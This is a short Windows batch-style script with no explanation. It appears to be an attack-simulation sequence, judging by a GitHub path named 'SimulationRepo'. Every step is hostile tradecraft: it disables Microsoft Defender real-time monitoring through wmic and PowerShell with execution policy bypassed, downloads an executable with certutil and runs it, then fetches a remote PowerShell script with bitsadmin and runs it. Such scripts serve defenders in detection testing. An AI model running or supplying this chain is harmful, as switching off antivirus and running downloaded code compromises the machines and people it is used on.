wmic process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring 1\""
timeout /t 10 /nobreak >nul
certutil.exe -urlcache -f "https://aka.ms/ioavtest" "%Temp%\validatecloud.exe"
cmd /c "%Temp%\validatecloud.exe"
timeout /t 10 /nobreak >nul
bitsadmin /transfer kjninjaDL /download /priority normal https://raw.githubusercontent.com/LearningKijo/ResearchDev/main/DEV/SimulationRepo/dev7.ps1 %temp%\dev7.ps1
cmd /c "%Temp%\dev7.ps1"
